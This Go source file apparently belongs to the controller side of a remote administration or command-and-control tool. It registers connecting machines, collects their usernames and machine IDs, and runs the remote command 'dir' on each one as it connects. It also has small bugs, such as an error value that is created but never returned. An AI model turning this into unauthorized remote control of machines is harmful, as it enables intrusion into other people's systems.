package client

import (
	"./types"
	"bytes"
	"encoding/gob"
	"errors"
	"fmt"
	log "github.com/sirupsen/logrus"
	"net"
	"sync"
	"time"
)

var ConnectedClients = make(map[Client]bool)		// Client set

// TODO: Add a consecutive ID
type Client struct {
	conn net.Conn
	mux  sync.Mutex
	IP   string
	BasicSystemInfo types.BasicSystemInfo
	SystemInfo		types.SystemInfo
}

func NewClient(conn net.Conn) Client {
	newClient := Client{conn:conn, IP:conn.RemoteAddr().String()}
	ConnectedClients[newClient] = false
	go newClient.OnConnect()		// Run the OnConnect function
	return newClient
}

// This function runs when the client connects for the first time
func (c Client) OnConnect() {
	err := c.Ping()		// Ping the client to see if it is working
	if err != nil {
		log.Warnf("Error pinging client %s", c)
		c.Delete()	// If it doesn't ping, remove the client
	}
	ConnectedClients[c] = true		// Append the new client to the client list

	basicSystemInfo, err := c.GetBasicSystemInfo()	// Cache the basic system info
	if err == nil {
		log.Printf("New client connected with IP %s and username %s (%s)", c.IP, basicSystemInfo.Username, basicSystemInfo.MachineID)
	}
	_, res, err := c.RunCommand("dir", false)
	if err != nil {
		log.Println(err)
	}
	println(res)

}

// Deletes the client from the client list and closes the connection
func (c Client) Delete() {
	log.Printf("Client %s disconnected", c)
	delete(ConnectedClients, c)
	_ = c.conn.Close() // Close the connection
}

func (c Client) String() string {
	if c.BasicSystemInfo != (types.BasicSystemInfo{}) {
		return fmt.Sprintf("%s; %s", c.IP, c.BasicSystemInfo.Username)
	}
	return c.IP
}

// Send data and wait for a response
func (c Client) Send(b []byte) ([]byte, error) {
	log.Debugf("Sending %v to client %s", b, c)

	c.mux.Lock()              // Lock the mutex so only one thread can access the client at once
	defer c.mux.Unlock()      // Unlock it when the function is done
	_, err := c.conn.Write(b) // Try to write data
	if err != nil {           // If there is an error, print an error and delete the client
		log.Debugf("Error writing to client %s: %s Removing the client", c, err)
		c.Delete()
		return nil, err
	}

	/// Get response
	err = c.conn.SetReadDeadline(time.Now().Add(60 * time.Second)) // Make the read time out after 60 seconds
	resp := make([]byte, 4096)
	n, err := c.conn.Read(resp)
	resp = resp[:n]
	if err != nil {
		// For some reason there was an error reading
		log.Debugf("Error reading from client %s: %s", c, err)
		_ = c.Ping()	// Ping the client and remove it if it can't ping
		return nil, err
	}
	// If we successfully read from the client, return the response and no error
	// The last item of the response is cut off because it is a \n
	log.Debugf("Received %v from client %s", resp, c)
	return resp, nil
}

/*
 * Sends a structured message to the client.
 * Params:
 *   messageID
 *   data: the data that will be serialized and sent to the client
 *   response: A pointer to the struct to store the response in
 *   expectedResponseID: If the actual response ID differs from this variable, it will return an error
 * Returns:
 *   responseID: the ID of the response
 *   err: any errors
 */
func (c Client) SendMessage(messageID int, data interface{}, response interface{}, expectedResponseID byte) error {
	// Check if messageID is too large
	if messageID > 255 {
		errors.New("message ID is too large")
	}

	var payloadBuffer bytes.Buffer
	if data != nil {	// Add the payload to the buffer if there is a payload
		encoder := gob.NewEncoder(&payloadBuffer)
		err := encoder.Encode(data)
		if err != nil { // If there is an error encoding, return it
			log.Printf("error encoding: %s", err)
			return err
		}
	}

	resp, err := c.Send(append([]byte{byte(messageID)}, payloadBuffer.Bytes()...))		// Create a new byte array with the messageID as the
																		// first byte and the data as the rest
	if err != nil {		// Return the error if we get one
		return err
	}
	// If we don't get any errors, return the first byte of the response as the responseID and the rest as the responseData
	// If the response is only one byte, return just the response ID
	if len(resp) == 0 {	// If the length of the response is 0, return nothing
		return nil
	}
	if resp[0] != expectedResponseID {	// If the response id is different than expected
		return errors.New(fmt.Sprintf("response id different than expected: received %x, expected %x", resp[0], expectedResponseID))
	}
	if len(resp) == 1 {	// If the length of the response is 1, return nothing
		return nil
	}
	// Otherwise, deserialize the data and return that
	buff := bytes.NewBuffer(resp[1:]) // Don't use the first element of the buffer
	decoder := gob.NewDecoder(buff)
	err = decoder.Decode(response)
	if err != nil {
		log.Printf("error decoding: %s", err)
		return err
	}
	return nil
}